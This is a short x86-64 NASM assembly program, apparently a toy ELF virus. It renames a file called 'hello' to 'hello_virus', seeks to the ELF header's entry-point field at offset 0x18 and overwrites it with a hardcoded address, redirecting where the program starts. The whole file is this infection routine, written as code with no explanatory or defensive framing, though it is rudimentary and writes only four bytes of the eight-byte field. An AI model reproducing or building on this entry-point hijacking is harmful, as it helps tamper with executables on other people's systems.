; CONSTANTS
SYS_OPEN  equ 2
SYS_RENAME equ 82
SYS_LSEEK equ 8
SYS_EXIT equ 60
SYS_CLOSE equ 3
SYS_WRITE equ 1
O_RDWR	equ 2


;SECTION .data

SECTION .text
	global _start

fileName db "hello", 0
fileName_len equ $-fileName
injName db "hello_virus", 0
injName_len equ $-injName
injectEntry dd 0x401156

_start:
	mov	rax, 	SYS_RENAME
	mov	rdi, 	fileName
	mov	rsi, 	injName
	syscall


	mov	rax,	SYS_OPEN
	mov	rdi,	injName
	mov	rsi,	O_RDWR
	syscall

	mov	r9,	rax	; r9 has fd
	
	mov	rdi,	r9	; fd
	mov	rax,	SYS_LSEEK ;sys call
	mov	rsi,	0x18	; offset
	mov	rdx,	0	; Origin
	syscall

	mov	rax,	SYS_WRITE
	mov	rdi,	r9
	mov	rsi,	injectEntry
	mov	rdx,	4
	syscall

	mov	rax,	SYS_CLOSE
	syscall

	mov	rax,	SYS_EXIT
	mov	rdi,	0
	syscall




